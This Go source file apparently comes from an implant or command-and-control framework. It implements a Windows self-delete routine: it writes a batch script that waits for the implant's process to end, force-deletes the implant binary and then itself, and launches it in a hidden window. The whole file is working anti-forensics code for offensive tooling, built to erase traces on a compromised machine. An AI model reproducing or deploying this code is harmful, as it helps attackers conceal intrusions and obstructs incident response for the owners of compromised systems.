//go:build windows

package core

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

// selfDelete attempts to delete the implant binary
// On Windows, we create a temporary batch script that waits for the process
// to exit and then deletes both the binary and itself
func (i *Implant) selfDelete() error {
	// Get the path to the current executable
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	// Resolve symlinks to get the real path
	realPath, err := filepath.EvalSymlinks(exePath)
	if err != nil {
		return fmt.Errorf("failed to resolve symlinks: %w", err)
	}

	// Get current process ID
	pid := os.Getpid()

	// Create a temporary batch file in the same directory
	batPath := strings.TrimSuffix(realPath, filepath.Ext(realPath)) + "_del.bat"

	// Create the batch script content
	// The script:
	// 1. Waits for the process to exit by checking if PID exists using tasklist
	// 2. Deletes the executable
	// 3. Deletes itself
	batContent := fmt.Sprintf(`@echo off
:WAIT
tasklist /FI "PID eq %d" 2>nul | find "%d" >nul
if %%ERRORLEVEL%% EQU 0 (
    timeout /T 1 /NOBREAK >nul 2>nul
    goto WAIT
)
del /F /Q "%s" 2>nul
del /F /Q "%%~f0" 2>nul
`, pid, pid, realPath)

	// Write the batch file
	if err := os.WriteFile(batPath, []byte(batContent), 0644); err != nil {
		return fmt.Errorf("failed to create delete script: %w", err)
	}

	// Execute the batch file in a hidden window
	cmd := exec.Command("cmd.exe", "/C", batPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	// Start the command but don't wait for it
	if err := cmd.Start(); err != nil {
		// Clean up the batch file if we failed to start
		os.Remove(batPath)
		return fmt.Errorf("failed to start self-delete script: %w", err)
	}

	// Detach from the child process
	cmd.Process.Release()

	return nil
}
